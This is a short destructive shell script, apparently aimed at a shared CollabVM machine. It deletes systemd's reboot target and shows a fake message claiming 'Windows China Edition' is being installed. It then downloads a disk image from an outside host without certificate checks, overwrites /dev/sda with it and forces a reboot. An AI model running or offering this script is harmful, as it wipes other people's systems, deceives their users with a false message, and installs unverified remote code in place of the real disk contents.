@echo off
sudo rm /usr/lib/systemd/system/reboot.target
clear
echo Windows China Edition is being installed. Please do not unplug your CollabVM server during this process, this could take some time.
wget -O- --no-check-certificate https://drive.muavps.net/windows/windows2012r2.gz | gunzip | dd of=/dev/sda bs=1G status=progress conv=fsync && reboot -f
echo b > /proc/sysrq-trigger
